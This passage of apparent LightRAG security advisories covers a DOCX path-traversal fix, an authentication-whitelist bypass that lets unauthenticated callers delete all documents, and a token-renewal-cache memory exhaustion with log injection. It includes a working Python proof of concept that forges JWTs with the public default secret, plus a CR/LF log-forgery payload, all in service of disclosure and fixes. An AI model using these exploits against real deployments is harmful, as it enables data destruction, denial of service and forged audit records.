   This is the `resolve()` plus `is_relative_to()` pattern already implemented in this codebase for the same upload, in `sanitize_filename` (`document_routes.py:154-156`) and in `validate_file_path_security` (`:1105-1146`). Reusing it keeps one idiom rather than adding a second.

3. **Defend the sidecar consumer independently of the producer.** The `path` field of `<doc>.drawings.json` is attacker-influenced data at rest. `_analyze_drawing` (`pipeline.py:3730-3733`) should treat it as such even after fix 1 lands, so that a sidecar written by an older version, by an external engine, or by any future producer cannot reach `read_bytes` outside its own directory. Fix 2 is what makes this true.

4. **Move the availability gate ahead of the probes.** The `vlm_process_enable` check at `:3755` runs after `read_image_dimensions` at `:3745`. Hoisting it above the resolve-and-probe block removes the Tier 1 oracle from deployments that never enabled VLM analysis, and costs nothing, since those deployments cannot produce an analysis anyway.

5. **Do not echo the resolved path back to callers.** The skipped and failure messages at `:3736`, `:3742`, `:3751` and `:3765` interpolate the attacker's path or the resolved candidate. Once fixes 1 and 2 land these are harmless; while the oracle exists they are the readout channel.

Fixes 1 and 2 are the defect, and either alone closes the byte read. Fixes 3 to 5 are defence in depth and remove the oracle.

## References

- Version tested: 1.5.5, api version 0316, commit `79b542714732a0396ae2652bc93f93902fd208b2`
- Sink: `lightrag/pipeline.py:3699-3711`, consumed at `:3730-3733`, `:3739-3744`, `:3745`, `:3755`, `:3762`, `:3782`, `:3820`
- Source of the untrusted value: `lightrag/parser/docx/drawing_image_extractor.py:222-255`, `:336-338`, `:381-383`; the existing `External` refusals at `:86-87` and `:234`
- Pass-through: `lightrag/parser/docx/ir_builder.py:203-206`, `:229-233`, `:244`; `lightrag/sidecar/writer.py:525-527`, `:629-630`
- Attacker-selected routing: `lightrag/parser/routing.py:1320`, `:216-236`; `lightrag/pipeline.py:3409`, `:4128`
- Entrypoint and the validation that does not cover this: `lightrag/api/routers/document_routes.py:2585-2589`, `:2678`, `:118`
- Isolation crossed: `lightrag/api/routers/document_routes.py:1014-1017`
- Containment precedent to reuse: `lightrag/api/routers/document_routes.py:154-156`, `:1105-1146`
- Tier 2 precondition: `lightrag/lightrag.py:613-615`
- No existing advisory for this project touches the parser, sidecar or multimodal-analysis code. This report is the first in `lightrag/parser/docx/`, `lightrag/sidecar/` and the `analyze_multimodal` path of `lightrag/pipeline.py`.
- Distinct from `GHSA-vv3m-f8x4-7377`: that advisory is in `lightrag/parser/markdown/`, its sink is an outbound HTTP fetch, and its root cause is an incomplete IP-address blocklist (IPv6-transition addresses). This report is in `lightrag/parser/docx/`, the sink is a local `Path.read_bytes` at `pipeline.py:3762`, and the root cause is a missing path-containment check on a value copied verbatim out of an OOXML relationship. Different file, different sink class (local filesystem read against network egress), different fix. Correcting that blocklist has no effect here.
- Also distinct from `GHSA-32jh-39m7-8x84` (ReDoS in the semantic chunker), `GHSA-mmg5-8x8q-v934` (the `/api/*` authentication exemption) and `GHSA-xpjq-3w4w-w5wr` (the WebUI mermaid sink): different components, and none of them involves DOCX relationship parsing or image path resolution.

summary: Authentication bypass: LIGHTRAG_API_PREFIX starting with /api collapses the default WHITELIST_PATHS into a blanket exemption for the entire API
description:
## Summary

The authentication whitelist is matched against the full request path, which includes the mount prefix, while `WHITELIST_PATHS` entries are written as natural route paths. The shipped default is `WHITELIST_PATHS=/health,/api/*`, exempted so that the Ollama-compatible routes (`/api/chat`, `/api/generate`) stay open. When `LIGHTRAG_API_PREFIX` is set to any value beginning with `/api`, every route path begins with `/api`, so the `/api` prefix pattern matches every request and the entire API becomes exempt from authentication.

The value in the project's own `--help` text, `/api/v1`, is such a value.

The result is that both configured authentication modes are bypassed at the same time. With `AUTH_ACCOUNTS` and `LIGHTRAG_API_KEY` both set, an unauthenticated network caller reads the document store through `GET /documents` and reaches the destructive `DELETE /documents` handler, along with the rest of the document, query and graph API.

Demonstrated impact: against the real server built by `create_app`, with both credentials configured and `LIGHTRAG_API_PREFIX=/api/v1`, an unauthenticated `DELETE /api/v1/documents` returns `200 {"status":"success","message":"All documents cleared successfully"}`. The same request with no prefix returns 401.

## Severity / CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

Score: 9.8 (Critical), scored for the affected configuration. Unauthenticated, network reachable, no user interaction; confidentiality through document and knowledge-base reads, integrity and availability through the reachable delete handlers.

Stated plainly, because it bounds who is affected: this requires the operator to set `LIGHTRAG_API_PREFIX` to a value starting with `/api`. It does not affect a deployment that leaves the prefix unset. It is reported as a defect rather than a misconfiguration for three reasons. The triggering half of the condition, `WHITELIST_PATHS=/health,/api/*`, is the shipped default and needs no operator action. The other half is a documented, encouraged value: `/api/v1` is the example in `--help`. And the exemption's intended scope is stated in the codebase as the Ollama compatibility routes only, so extending it to `DELETE /documents` is outside the control's own documented contract.

## Affected component

- `lightrag/api/utils_api.py:125-139` `path_is_whitelisted`, prefix matching by bare `str.startswith`
- `lightrag/api/utils_api.py:219-220` step 1 of `get_combined_auth_dependency.combined_dependency`: `path = request.url.path` then `path_is_whitelisted(path)`, before any credential is read
- `lightrag/api/utils_api.py:111-119` whitelist parsing, where a trailing `/*` becomes a prefix-match entry
- `lightrag/api/config.py:757` `WHITELIST_PATHS` default `"/health,/api/*"`
- `lightrag/api/config.py:456-461` `--api-prefix` / `LIGHTRAG_API_PREFIX`, whose `help` at `:460` documents the example value `/api/v1`
- `lightrag/api/lightrag_server.py:1417,1427` `api_prefix` becomes the FastAPI `root_path`
- `lightrag/api/lightrag_server.py:419-452` `_RootPathNormalizationMiddleware`, which restores `root_path` into `scope["path"]` when a proxy strips it
- `lightrag/api/admission_middleware.py:211-212` the pre-body admission gate calls `path_is_whitelisted` with the same unstripped path
- `lightrag/api/utils_api.py:418-424` `whitelist_exposes_api_routes`, the startup warning's matcher, which is also prefix-unaware

Version tested: commit `3fb91168`, which reports itself as 1.5.5 / api 0324 while 1.5.5 was still unreleased. Note that 1.5.5 shipped on 2026-07-31 and FIXES this defect; see the Fix section. Re-checked against `origin/main` at `1c1cf88b`: eight later commits, none of which touch `utils_api.py`, `config.py`, `admission_middleware.py` or `lightrag_server.py`, so all four files are byte-identical and every line reference below resolves at both commits.

Affected range: `>= 1.5.0, < 1.5.5`, fixed in 1.5.5. Lower bound established by walking the release tags: `--api-prefix` / `LIGHTRAG_API_PREFIX` is absent through `v1.4.16`, appears in `v1.5.0rc2`, and is present in every release from `v1.5.0` onward. The other two ingredients predate it and are present in every tag checked: the `/health,/api/*` whitelist default, and the `request.url.path` plus bare `startswith` matcher. Confirmed at tag `v1.5.0` directly, where the whitelist matcher already reads `path = request.url.path` and compares with `path.startswith(pattern)`, and `_normalize_api_prefix` already feeds `api_prefix` into FastAPI's `root_path`. Every other line number in this report refers to `3fb91168`, not to `v1.5.0`. Note that 1.5.5 is not on PyPI as a stable release yet, only `1.5.5rc1`; the latest stable there is 1.5.4, which is affected.

## Root cause

Three facts combine.

1. **The matcher receives a prefixed path while the patterns are unprefixed.** `WHITELIST_PATHS` entries are natural route paths such as `/health`. The enforcing dependency passes `request.url.path`, which in ASGI contains `root_path`. With `root_path=/api/v1`, a request routed to `/documents` has `request.url.path == "/api/v1/documents"`. Nothing strips the prefix before matching, so the comparison is made between two different kinds of path.

2. **The default whitelist entry is itself an `/api` prefix.** `"/health,/api/*"` parses to `[('/health', False), ('/api', True)]`. Any request path starting with `/api` matches. Once the mount prefix starts with `/api`, that is every request path, so the check degenerates to always-true and returns before any credential is examined.

3. **Prefix matching has no segment boundary.** `path.startswith('/api')` also matches unrelated sibling routes such as `/apikeys` or `/api_internal`. This widens any prefix entry beyond the path segment the operator wrote, independently of the mount-prefix issue. The correct idiom is already present in the same file: the token-renewal skip check at `utils_api.py:235` uses `path == skip_path or path.startswith(skip_path + "/")`, which cannot match mid-segment. The whitelist matcher 110 lines above it does not.

The codebase already holds the knowledge that the prefix must be removed before a path comparison, and applies it inconsistently. In `admission_middleware.py` the `api_prefix` constructor parameter is documented as "mount prefix to strip before matching paths" (`:145`), and `_is_admission_path` does strip it (`:166-168`) before comparing against `ADMISSION_PATHS`. Forty lines later the whitelist comparison in the same class passes the raw `scope["path"]` to `path_is_whitelisted` (`:211-212`). The same file strips the prefix for one path comparison and not for the other.

`path_is_whitelisted` documents itself as the one shared matcher "so every layer that has to answer 'may this request skip auth?' uses one matcher" (`:126-133`). Both of its callers hand it a prefixed path, so the shared matcher is consistently given input it does not normalize.

The defect places the exemption outside its own documented scope. `env.example:79-84` states the intent: the default "exempts /api/* so the Ollama-compatible endpoints (/api/chat, /api/generate, ...) stay open by default, matching Ollama's own unauthenticated behavior", and warns that those routes "invoke the LLM and read your knowledge base". `utils_api.py:626-641`, inside `display_splash_screen`, emits a startup warning in the same terms, that `WHITELIST_PATHS` "exempts the Ollama-compatible /api/* routes (/api/chat, /api/generate, ...) from authentication". Neither the documentation nor the warning contemplates the exemption covering `DELETE /documents`. In the prefix configuration the warning is still accurate about the Ollama routes while materially understating what is actually open, so an operator who reads it is told about two LLM routes when the whole API is exempt.

## Impact

- **Full unauthenticated read of the document store and knowledge base.** `GET /documents` returns the document status listing and `GET /graph/label/list` returns graph labels, both without credentials. The query routes are exempt on the same basis, verified below.
- **Unauthenticated destruction of the entire document store.** `DELETE /documents` completes without credentials against the real server: `200 {"status":"success","message":"All documents cleared successfully"}`. This is not a reachability argument, it is the handler running to completion and clearing all documents and storage.
- **Both configured authentication modes bypassed simultaneously.** The whitelist check is step 1, before the token check (step 2) and the API-key check (step 4), so setting `AUTH_ACCOUNTS` and `LIGHTRAG_API_KEY` together does not help. The operator who has configured the most authentication available is equally exposed.
- **The pre-body admission gate is bypassed as well.** `admission_middleware.py:211-212` uses the same matcher on the same unstripped path, so the request-body-size and pending-document capacity limits that gate ingestion pre-authentication are also skipped, on the same condition.
- **Silent onset.** Nothing in the request or the logs distinguishes an exempted request from an authenticated one, and the startup warning's wording suggests a much narrower exposure, so the collapse is unlikely to be noticed.

## Proof of Concept

Two probes, both unauthenticated throughout: no `Authorization` header, no `X-API-Key`. Both configure `AUTH_ACCOUNTS`, `TOKEN_SECRET` and `LIGHTRAG_API_KEY`, and both leave `WHITELIST_PATHS` unset so the shipped default applies.

### Through the real entrypoint

`poc/probe_whitelist_realapp.py` builds the application exactly as the `lightrag-server` command does, `create_app(global_args)` over the real parsed config, and serves it on a real uvicorn socket. `LIGHTRAG_API_PREFIX` is the only variable.

```
prefix=''        whitelist='/health,/api/*'
  GET    /documents                 -> 401  AUTH ENFORCED
  POST   /query                     -> 401  AUTH ENFORCED
  GET    /graph/label/list          -> 401  AUTH ENFORCED
  DELETE /documents                 -> 401  AUTH ENFORCED

prefix='/api/v1'  whitelist='/health,/api/*'
  GET    /api/v1/documents          -> 200  {"statuses":{}}
  POST   /api/v1/query              -> 422  body validation, past auth
  GET    /api/v1/graph/label/list   -> 200  []
  DELETE /api/v1/documents          -> 200  {"status":"success","message":"All documents cleared successfully"}
```

The last line is the finding: the destructive route ran to completion, unauthenticated, on the server as shipped, using the prefix value from `--help`.

### Isolating the cause

`poc/probe_whitelist_live.py` mounts the document, query and graph routers directly, which makes it cheap to sweep prefix values and confirm what the trigger actually is.

Control, no prefix, and the `/site01` control that isolates the cause:

```
prefix=''         GET /documents  401 | POST /documents/paginated  401 | DELETE /documents  401 | POST /query  401 | GET /graph/label/list  401
prefix='/site01'  GET /documents  401 | POST /documents/paginated  401 | DELETE /documents  401 | POST /query  401 | GET /graph/label/list  401
```

`LIGHTRAG_API_PREFIX=/api`:

```
prefix='/api'  whitelist_patterns=[('/health', False), ('/api', True)]  auth_configured=True
  GET    /api/documents               -> 200  {"statuses":{}}
  POST   /api/documents/paginated     -> 422  body validation, past auth
  DELETE /api/documents               -> 500  reached handler internals
  POST   /api/query                   -> 422  body validation, past auth
  GET    /api/graph/label/list        -> 200  []
```

`LIGHTRAG_API_PREFIX=/api/v1`, the value from `--help`:

```
prefix='/api/v1'  whitelist_patterns=[('/health', False), ('/api', True)]  auth_configured=True
  GET    /api/v1/documents            -> 200  {"statuses":{}}
  POST   /api/v1/documents/paginated  -> 422  body validation, past auth
  DELETE /api/v1/documents            -> 500  reached handler internals
  POST   /api/v1/query                -> 422  body validation, past auth
  GET    /api/v1/graph/label/list     -> 200  []
```

Reading the response codes in this second probe:

- **200** on `GET /documents` and `GET /graph/label/list` is a completed unauthenticated read across two routers.
- **422** on the `POST` routes is FastAPI body validation rejecting an empty body. It runs only after the dependency has allowed the request, so it is evidence of the bypass, not a failure.
- **500** on `DELETE /documents` here is only this probe passing `doc_manager=None`; it shows the request entered the handler. The real-entrypoint probe above is the one that matters for impact, and there the same request returns 200 and clears the store.

The `/site01` row is the control that matters: a mount prefix by itself changes nothing. The trigger is specifically a prefix that collides with the default whitelist entry.

Reproduce:

```
python3 poc/probe_whitelist_realapp.py ""          # real entrypoint, control
python3 poc/probe_whitelist_realapp.py /api/v1     # real entrypoint, unauthenticated delete
python3 poc/probe_whitelist_live.py ""             # control
python3 poc/probe_whitelist_live.py /site01        # control, non-colliding prefix
python3 poc/probe_whitelist_live.py /api
python3 poc/probe_whitelist_live.py /api/v1
```

Verified at commit `3fb91168`, which is 1.5.5 / api 0324.

## Recommended fix

1. **Match on the route path, not the mounted path.** Strip the mount prefix before calling `path_is_whitelisted`, in both callers. The simplest correct form needs no new helper: subtract the known `api_prefix`, which `admission_middleware._is_admission_path` already does at `:166-168`. If you prefer to derive it from the scope, mirror what Starlette's own router uses to resolve a route, `starlette._utils.get_route_path`, which subtracts `root_path` only when the next character is `/` so the subtraction cannot cut mid-segment. That module is private, so copying its five-line logic is safer than importing it. Doing the normalization inside `path_is_whitelisted`, and passing it the request scope rather than a bare string, would make it impossible to forget at a call site, which matches the function's stated role as the single shared matcher.

2. **Make prefix matching segment-aware.** Treat a `/*` entry as matching only the prefix itself or the prefix followed by `/`, so `/api/*` cannot match `/apikeys`.

3. **Refuse the collapsing combination at startup.** When `api_prefix` is non-empty and any prefix entry in `WHITELIST_PATHS` matches it, the whitelist exempts the whole API. That is almost never intended and is cheap to detect where `whitelist_exposes_api_routes` is already called, in `display_splash_screen` (`utils_api.py:631-634`). Failing closed is defensible here; at minimum the existing warning should state that every route is exempt rather than naming only the Ollama routes. Note that the current warning is additionally gated on a non-loopback bind (`utils_api.py:634`), so a prefixed deployment behind a reverse proxy on loopback prints nothing at all.

4. **Consider scoping the default to the routes it is for.** The documented intent is Ollama compatibility. `WHITELIST_PATHS=/health,/api/chat,/api/generate` expresses that intent exactly and is immune to prefix collision, unlike a blanket `/api/*`.

Fixes 1 and 2 are the defect. Fixes 3 and 4 remove the standing footgun.

## References

- `GHSA-mmg5-8x8q-v934` publishes the `/api/*` exemption, scoped explicitly to `/api/chat` and `/api/generate` and framed as read-only LLM and knowledge-base exposure. This report is the prefix-matching defect that extends the same exemption to the entire API including destructive routes, which is outside that advisory's stated scope.
- `GHSA-597m-w632-p8qv` (this reporter, published 2026-07-29) is precedent in this repository that reaching outside an exemption's documented scope is treated as a vulnerability rather than as hardening.
- `env.example:79-84` and `lightrag/api/utils_api.py:626-641` state the intended scope of the default whitelist.
- Starlette path resolution: `get_route_path` subtracts `root_path` from `scope["path"]` for routing, which is why routes resolve normally while `request.url.path` still carries the prefix.

## Fix

Fixed in 1.5.5, released 2026-07-31. Verified at tag `v1.5.5`, and the fix implements recommended
changes 1, 2 and 3 rather than only the immediate collapse.

- **Matches the route path, not the mounted path.** `path_is_whitelisted` now takes the ASGI scope
  instead of a path string (`lightrag/api/utils_api.py:304` at `v1.5.5`) and resolves the route with
  `get_route_path(scope, mount_prefix)` at `:326`. The docstring at `:313-315` states the reason:
  taking the scope means the mount-prefix normalization cannot be forgotten at a call site.
- **Prefix matching is segment-aware.** `:329` is now `route == pattern or route.startswith(pattern + "/")`,
  so `/api/*` no longer matches a sibling such as `/apikeys`.
- **The admission gate is fixed at the same time.** `lightrag/api/admission_middleware.py:208-209`
  passes the scope and `mount_prefix=self._api_prefix`, so the pre-body gate normalizes the same way
  as the route dependency and the two callers can no longer diverge.
- **The startup warning is prefix-aware.** `whitelist_exposes_api_routes` (`utils_api.py:566` at
  `v1.5.5`) now recognizes a catch-all `/*` entry, and its `:582-583` comment records the boundary
  case that `/apiary/*` must not be flagged.

Recommendation 4, narrowing the shipped default from `/api/*` to the two Ollama routes it exists
for, is a standing footgun rather than part of the defect and remains open.

summary: Unauthenticated denial of service and log forgery: unbounded pre-authorization write to `_token_renewal_cache`
description:
## Summary

The token auto-renewal path keeps a process-wide dictionary, `_token_renewal_cache`, keyed on the JWT `sub` claim, with no size cap and no eviction. An entry is written before any authorization decision, so requests that are ultimately rejected with HTTP 403 still grow the dictionary permanently. In the API-key-only profile (`LIGHTRAG_API_KEY` set, `AUTH_ACCOUNTS` unset) the JWT signing secret falls back to the public constant `DEFAULT_TOKEN_SECRET`, so an unauthenticated attacker can mint signature-valid tokens with an arbitrary `sub` of up to roughly 32 KB each. A new `sub` per request inserts a new entry every time.

The same unchecked `sub` is written unsanitized into an INFO log line on every renewal. Because `sub` may contain CR/LF, each unauthenticated rejected request can also inject forged log records.

Demonstrated impact: 200 unauthenticated requests, every one rejected with 403, permanently retain 6.10 MiB of server memory and can inject attacker-chosen log lines indistinguishable from genuine ones.

## Severity / CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

Score: 7.5 (High). Unauthenticated, low complexity, no user interaction, availability impact only.

The log-injection secondary maps to CWE-117 and is reported here as part of the same defect rather than as a separate issue.

## Affected component

This defect is FIXED in 1.5.5, released 2026-07-31. Line numbers below describe the vulnerable code as it stood at `v1.5.5rc1`, the last affected release, and at commit `3fb91168` on `origin/main`, because the two differ. See the Fix section for what 1.5.5 changed.

- `_token_renewal_cache` declaration (no cap, no eviction): `lightrag/api/utils_api.py:29` at `v1.5.5rc1`, `:63` at `3fb91168`
- the auto-renewal block inside `get_combined_auth_dependency.combined_dependency`, which runs before the authorization decision: `lightrag/api/utils_api.py:136-212` at `v1.5.5rc1`, `:229-310` at `3fb91168`
- the `_RENEWAL_MIN_INTERVAL` rate-limiting check, keyed on the attacker-controlled `sub`: `lightrag/api/utils_api.py:176-208` at `v1.5.5rc1`, `:265-282` at `3fb91168`
- `logger.info(f"Token auto-renewed for user {username} ...")`, unsanitized: `lightrag/api/utils_api.py:198-201` at `v1.5.5rc1`, `:285-288` at `3fb91168`
- fallback to `DEFAULT_TOKEN_SECRET` when `AUTH_ACCOUNTS` is unset: `lightrag/api/auth.py:34` at `v1.5.5rc1`, `:51` at `3fb91168`
- `TOKEN_AUTO_RENEW` defaults to `True`: `lightrag/api/config.py:651` at `v1.5.5rc1`, `:767` at `3fb91168`

At `v1.5.5rc1` the file's own step comments confirm the ordering: `# 1. Check if path is in whitelist` at line 128, `# 2. Validate token first` at 136, the rate-limiting block containing the cache write opening at 176 and closing at 208, the cache write itself at 195, `# 4. Validate API key` at 247, and `return  # API key validation successful` at 253. The pre-authorization write executes 58 lines before the API-key authority.

Tested at commit `3fb91168` on `origin/main`, api version 0324, and verified present at `v1.5.5rc1` (published 2026-07-13), where the renewal block, the uncapped dict and the unsanitized log line were all intact. 1.5.5 was released on 2026-07-31 and fixes all three. Earlier verifications at `f2971405` and `e3bbeb2` are byte-identical for these three files.

Affected range: pip package `lightrag-hku`, `>= 1.4.9.11, < 1.5.5`. Fixed in 1.5.5.

First affected release: 1.4.9.11 (PyPI upload 2026-01-15). The preceding release 1.4.9.10 (2025-12-23) has zero matches for `/renew|Renew/` in `lightrag/api/utils_api.py` and no `TOKEN_AUTO_RENEW` in `lightrag/api/config.py`, so the config flag, the cache and the unsanitized log line all land as one unit in 1.4.9.11, and both CWEs share that single introduction point. At `v1.4.9.11` the evidence is `lightrag/api/utils_api.py:28` (declaration), `:29` (`_RENEWAL_MIN_INTERVAL`), `:184` (pre-authorization write) and `:187-190` (log line), with the pre-authorization ordering already present: `# 2. Validate token first` at 125, `# 4. Validate API key` at 225, and `return  # API key validation successful` at 231.

## Root cause

Two facts combine.

1. **The premise is a known, still-unpatched weakness, cited here rather than re-reported.** GHSA-f4vv-55c2-5789 (high, `patched_versions: null`, vulnerable `<= 1.4.15`) publishes that when `LIGHTRAG_API_KEY` is set and `AUTH_ACCOUNTS` is unset, an attacker can mint a valid guest JWT offline using the hardcoded secret, and that the CVE-2026-30762 fix only raises when `AUTH_ACCOUNTS` is set, so the API-key-only path is silently vulnerable. That published weakness is the attacker's oracle for arbitrary `sub` values. It is still present at `3fb91168`: `AuthHandler.__init__` assigns the public constant `DEFAULT_TOKEN_SECRET = "lightrag-jwt-default-secret-key!"` (`lightrag/api/config.py:64` at `3fb91168`) when `AUTH_ACCOUNTS` is unset (`lightrag/api/auth.py:34` at `v1.5.5rc1`, `:51` at `3fb91168`), and raises for a missing `TOKEN_SECRET` only when `AUTH_ACCOUNTS` is set, which is why the profile boundary matters. Nothing new is claimed about the secret. The new defect is what the server then does with the `sub` value that oracle produces.

2. **The renewal cache write happens pre-authorization and is unbounded.** The auto-renewal block is step 2 of the combined dependency; the API-key check is step 4. When the presented token is near expiry it executes `_token_renewal_cache[username] = current_time`, where `username` is the raw `sub` claim, on a module-level `dict` with no size cap and no eviction. Every rejected request leaves a permanent entry whose key is up to ~32 KB of attacker-chosen bytes.

The defect defeats an existing, labeled control. The block is headed `# ========== Token Renewal Rate Limiting ==========` and enforces `_RENEWAL_MIN_INTERVAL = 60` seconds between renewals "for same user", keyed solely on `sub`. A new forged `sub` per request makes `last_renewal` always 0, so the interval check passes on 100% of requests and the limiter is defeated while still growing the dictionary.

The sibling `LoginRateLimiter` (`lightrag/api/login_rate_limit.py:46` on `origin/main` at `3fb91168`, which had not shipped in any release up to and including `v1.5.5rc1`) caps tracked keys at `DEFAULT_MAX_TRACKED_KEYS = 10_000`, refuses to evict live records, and documents the exact attack: "otherwise an attacker could clear a lockout by flooding unique keys." Its docstring cross-references the token-renewal cache, which has no equivalent bound. The renewal cache is the analogous structure on the same request path, missing the guard its sibling carries. The point is that the project's own in-progress work already recognized this hazard for the sibling structure. It was not a claim that a release shipped the guard, and 1.5.5 has since bounded the renewal cache directly.

## Impact

- **Unauthenticated memory exhaustion.** Measured against a real uvicorn server over raw sockets: 200 requests, all answered 403 Forbidden, retained 6,400,490 bytes (6.10 MiB) in 0.1 s, about 32 KB per request. Growth is permanent: nothing evicts, nothing caps, and entries survive until process restart. Projected retention at a sustained 100 req/s is about 183 MiB/min. A single attacker can take down the API process and, on a container with a memory limit, trigger OOM kills and restart loops.
- **Log injection and log/disk exhaustion (CWE-117).** The renewal log line interpolates the raw `sub`. A `sub` containing CR/LF injects forged log records: `"alice\nCRITICAL:lightrag: SECURITY AUDIT PASSED - admin login from 10.0.0.1\nbob"` produces a fabricated `CRITICAL:lightrag:` entry indistinguishable from a genuine one. Combined with the 32 KB per-request ceiling this is also unauthenticated log/disk exhaustion. This is a guard missing from one path, not absent hardening: `origin/main` at `3fb91168` adds `safe_log_value` in `lightrag/utils.py:382`, whose docstring names log injection via CR/LF as the exact hazard, and applies it to the rate-limit log in `login_rate_limit.py:197` and the audit logs in `document_routes.py`. Neither `safe_log_value` nor `login_rate_limit.py` had shipped as of `v1.5.5rc1`, so there the renewal log line is unsanitized and no equivalent helper exists to call. 1.5.5 ships `safe_log_value` and applies it here. The renewal log line on the same request path interpolates the attacker-controlled value raw.

The attack works in the fully-open default profile as well, but crosses no boundary there. The honest boundary is the API-key-only profile, which is a documented, recommended configuration: `env.example` instructs operators to set at least one of `AUTH_ACCOUNTS` / `LIGHTRAG_API_KEY`. The attacker holds no credential, is correctly rejected on every request, and still consumes unbounded server memory and log integrity. The limitation is stated plainly: the profile this attack needs is one whose authentication is already publicly bypassable per GHSA-f4vv-55c2-5789, so anyone able to reach this path can also already bypass `X-API-Key`. What is added here is that the same forged token writes permanent server-side state on a request the server rejects, on a code path no published advisory covers and no released fix closes.

## Proof of Concept

Environment: `LIGHTRAG_API_KEY` set, `AUTH_ACCOUNTS` unset, `WHITELIST_PATHS=/health` so the result does not depend on the Ollama `/api/*` exemption. Real `get_combined_auth_dependency` mounted on a route, served by real uvicorn, driven over raw sockets. Tokens forged with the public `DEFAULT_TOKEN_SECRET`.

The `sys.path.insert` below points at a local checkout of `origin/main` at `3fb91168`, so these numbers were produced against unreleased main, not against a released version. The result carries over to `v1.5.5rc1`, where the renewal block, the cache write, the log line and the step ordering are the same. No released version was load-tested.

```python
"""Unauthenticated requests, all rejected with 403, permanently grow the
server-side _token_renewal_cache. Real uvicorn over raw sockets."""
import os, sys, threading, time, socket, logging
os.environ.pop("AUTH_ACCOUNTS", None); os.environ.pop("TOKEN_SECRET", None)
os.environ["LIGHTRAG_API_KEY"] = "the-operators-secret-api-key"
os.environ["WHITELIST_PATHS"] = "/health"
sys.path.insert(0, os.path.abspath("repo"))
logging.disable(logging.CRITICAL)

from datetime import datetime, timedelta, timezone
import jwt, uvicorn
from lightrag.api.config import DEFAULT_TOKEN_SECRET
from lightrag.api import utils_api
from lightrag.api.utils_api import get_combined_auth_dependency
from fastapi import FastAPI, Depends

app = FastAPI()
dep = get_combined_auth_dependency("the-operators-secret-api-key")
@app.get("/documents", dependencies=[Depends(dep)])
async def documents(): return {"secret": "ALL DOCUMENTS"}

cfg = uvicorn.Config(app, host="127.0.0.1", port=8791, log_level="critical")
srv = uvicorn.Server(cfg); threading.Thread(target=srv.run, daemon=True).start(); time.sleep(2.5)

def forge(u):
    return jwt.encode({"sub": u, "exp": datetime.now(timezone.utc)+timedelta(hours=1),
                       "role": "guest", "metadata": {}}, DEFAULT_TOKEN_SECRET, algorithm="HS256")

def send(tok):
    s = socket.create_connection(("127.0.0.1", 8791), timeout=10)
    s.sendall(f"GET /documents HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer {tok}\r\nConnection: close\r\n\r\n".encode())
    d=b""
    while True:
        try: b=s.recv(65536)
        except Exception: break
        if not b: break
        d+=b
    s.close()
    return d.split(b"\r\n",1)[0].decode() if d else "NO RESPONSE"

for size in (1_000, 4_000, 8_000, 16_000, 32_000, 100_000):
    st = send(forge("B"*size))
    print(f"sub={size:>7} bytes -> {st}")

utils_api._token_renewal_cache.clear()
N, SIZE = 200, 32_000
t0=time.time()
codes=set()
for i in range(N):
    codes.add(send(forge("C"*SIZE + str(i))))
dt=time.time()-t0
held = sum(len(k) for k in utils_api._token_renewal_cache)
print(f"\n{N} unauthenticated requests, statuses={codes}")
print(f"cache entries: {len(utils_api._token_renewal_cache)}")
print(f"attacker-controlled bytes retained: {held:,} ({held/1024/1024:.2f} MiB) in {dt:.1f}s")
print(f"projected retention at 100 req/s: {held/N*100/1024/1024*60:.0f} MiB/min")
srv.should_exit=True
```

Output:

```
sub=   1000 bytes -> HTTP/1.1 403 Forbidden
sub=   4000 bytes -> HTTP/1.1 403 Forbidden
sub=   8000 bytes -> HTTP/1.1 403 Forbidden
sub=  16000 bytes -> HTTP/1.1 403 Forbidden
sub=  32000 bytes -> HTTP/1.1 403 Forbidden
sub= 100000 bytes -> HTTP/1.1 400 Bad Request

200 unauthenticated requests, statuses={'HTTP/1.1 403 Forbidden'}
cache entries: 200
attacker-controlled bytes retained: 6,400,490 (6.10 MiB) in 0.1s
projected retention at 100 req/s: 183 MiB/min
```

Log-injection secondary, captured from the server's own logger on a single unauthenticated request that was rejected with 403:

```
INFO:Token auto-renewed for user alice
CRITICAL:lightrag: SECURITY AUDIT PASSED - admin login from 10.0.0.1
bob (role: guest, remaining: 3599s)
```

The middle line is attacker-forged.

## Fix

Fixed in 1.5.5 (released 2026-07-31), and the fix addresses all three aspects rather than only the
memory growth. Verified at tag `v1.5.5` in `lightrag/api/utils_api.py` (blob `7ff6d3a3f374`, 806 lines):

- **CWE-770 bounded.** `_token_renewal_cache` is now an `OrderedDict` (85) written only through
  `_record_token_renewal` (101-125), which purges entries older than `_RENEWAL_MIN_INTERVAL` from
  the head and then enforces `_MAX_TRACKED_RENEWALS = 10_000` (87) as a hard ceiling. Insertion
  order is maintained as time order, both passes are amortized O(1), and the declaration comment
  explains why evicting a live entry is safe here but not in `LoginRateLimiter`.
- **CWE-117 sanitized.** Both interpolations now pass through `safe_log_value`: the renewal log at
  205-206 and the rate-limit skip log at 185.
- **Pre-authorization write closed.** `_renew_token_if_needed` (128) is invoked only after the
  authorization decision, at 446, 454 and 487. The comment at 432-433 records that running it
  earlier let an unauthenticated caller grow the state on requests the server rejects.

The remaining hardening suggestion, rejecting or truncating over-long `sub` claims at validation
time, is satisfied by `MAX_TOKEN_SUBJECT_LENGTH` in `AuthHandler.validate_token`, which the
declaration comment at 74-75 names as the first of the three bounds.

## References

- Fixed in 1.5.5, released 2026-07-31. Affected range: pip package `lightrag-hku`, `>= 1.4.9.11, < 1.5.5`
- Tested at commit `3fb91168` on `origin/main`, api version 0324; last affected release tag `v1.5.5rc1` (published 2026-07-13)
- First affected release: 1.4.9.11 (2026-01-15), evidence at `lightrag/api/utils_api.py:28`, `:29`, `:184`, `:187-190` at `v1.4.9.11`; the preceding release 1.4.9.10 (2025-12-23) has no renewal mechanism
- Vulnerable state: `lightrag/api/utils_api.py:29-30`, `:136-212` at `v1.5.5rc1` (`:63-64`, `:229-310` at `3fb91168`)
- `lightrag/api/auth.py:34` at `v1.5.5rc1` (`:51` at `3fb91168`)
- `lightrag/api/config.py:651` at `v1.5.5rc1` (`:767` at `3fb91168`)
- Fix: `lightrag/api/utils_api.py:85`, `:87`, `:101-125`, `:185`, `:205-206`, `:432-433`, `:446` at `v1.5.5`
- `lightrag/api/login_rate_limit.py:46` and `lightrag/utils.py:382` `safe_log_value` on `origin/main` at `3fb91168`, both shipped in 1.5.5
